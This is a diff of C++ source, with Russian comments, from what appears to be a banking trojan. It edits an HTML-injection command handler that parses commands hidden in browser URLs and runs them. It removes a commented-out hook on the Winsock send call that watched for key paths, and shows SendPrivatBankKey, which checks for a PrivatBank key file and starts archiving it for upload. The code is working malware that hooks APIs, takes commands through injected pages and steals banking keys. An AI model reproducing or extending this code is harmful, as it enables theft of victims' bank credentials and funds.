@@ -18,31 +18,6 @@ void SendFloppyDiskToServer(const char* Command, const char* Params);
 
 
 
-//typedef int (PASCAL FAR *Tsend) (SOCKET s, const char FAR * buf, int len, int flags);
-//
-//Tsend Real_Send = NULL;
-
-
-//int PASCAL FAR Hook_send(SOCKET s, const char FAR * buf, int len, int flags)
-//{
-//	if (STRA::Pos(buf, "keypath") >= 0)
-//	{
-//			len = len;
-//	}
-//	return Real_Send(s, buf, len, flags);
-//}
-
-
-
-void HTMLInjectsAdapterIntialize()
-{
-//	if ( HookApi( DLL_WINSOCK, 0xE797764 /* send */, &Hook_send ) )
-//	{
-//		__asm mov [Real_Send], eax
-//	}
-}
-
-
 typedef void (*THTMLInjectRequestCommand)(const char* Command, const char* Params);
 
 
@@ -60,10 +35,10 @@ typedef void (*THTMLInjectRequestCommand)(const char* Command, const char* Param
 //----------------------------------------------------------
 bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequest)
 {
-
+  
 
 	if (CloseRequest)
-		*CloseRequest = false;
+		*CloseRequest = false;  
 
 	if (STRA::IsEmpty(URL))
 		return false;
@@ -72,6 +47,11 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 	int Pos = STRA::Pos(URL, "://");
 	if (Pos >= 0)
 		URL += Pos + 3;
+
+	// Пропускаем имя домена
+	URL = STRA::Scan(URL, '/');
+	if (!URL) return false;
+	URL++;
 
 
 	// Определяем начало строки параметров
@@ -84,21 +64,21 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 	// в случае остутствия данных в домене FireFox автоматически
 	// дополняет команду строками www и .com
 	// т.е. наша команда получает вид www.command.com
-
-	if (STRA::Hash(URL, 4, true) == 0xEFDFBAE /* www. */)
-	{
-		URL += 4;
-		CmdLen -= 4;
-	}
-
-	if (CmdLen > 4)
-	{
-		PCHAR Tmp = (PCHAR)URL + (CmdLen - 4);
-		if (STRA::Hash(Tmp, 4, true) == 0x5D8F7ED /* .com */)
-		{
-			CmdLen -= 4;
-		}
-    }
+ 
+//	if (STRA::Hash(URL, 4, true) == 0xEFDFBAE /* www. */)
+//	{
+//		URL += 4;
+//		CmdLen -= 4;
+//	}
+//
+//	if (CmdLen > 4)
+//	{
+//		PCHAR Tmp = (PCHAR)URL + (CmdLen - 4);
+//		if (STRA::Hash(Tmp, 4, true) == 0x5D8F7ED /* .com */)
+//		{
+//			CmdLen -= 4;
+//		}
+//    }
 
 	// Обрабатываем команду
 	if (Params) Params++;
@@ -119,9 +99,9 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 	// Выполняем команду
 	bool Result = false;  
 	if (Command)
-	{  
+	{
 		Result = true;
-		if (CloseRequest) *CloseRequest = true;
+		if (CloseRequest) *CloseRequest = true; 
 
 		string CmdStr;
 		CmdStr.Copy(URL, 0, CmdLen);
@@ -133,6 +113,11 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 			EP = URLDecode(Params);
 			P = EP.t_str();
 		}
+
+
+//		string F;
+//		F.Format("Выполняется команда инжекта: %s; Параметры: %s", CmdStr.t_str(), Params);
+//		pMessageBoxA(0, F.t_str(), 0, 0);
 
 		Command(CmdStr.t_str(), P);
 	}
@@ -148,12 +133,10 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 //---------------------------------------------------
 void SendPrivatBankKey(const char* Command, const char* Params)
 {
-	if (!File::IsExists((PCHAR)Params))
-		return;
+	if (!File::IsExists((PCHAR)Params))  
+		return;       
+   
 
-//	string F;
-//	F.Format("keypat: %s", Params);
-//	pMessageBoxA(0, F.t_str(), 0, 0);
 
 	// Добавляем фал в архив
 	string FN = File::GetTempName2A();
